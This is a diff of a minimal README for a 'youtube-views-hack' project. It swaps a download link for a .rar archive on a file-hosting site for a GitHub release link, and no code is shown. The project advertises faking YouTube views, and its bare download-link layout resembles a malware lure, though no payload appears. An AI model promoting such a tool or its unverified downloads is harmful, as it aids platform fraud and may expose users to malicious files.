@@ -1,6 +1,6 @@
 # youtube-views-hack
 
-https://dosya.co/dpoqsyw56vzv/youtube-views-hack.rar.html Latest Version
+https://github.com/puluxy/youtube-views-hack/releases/tag/beta Latest Version
 
 #Setup
 
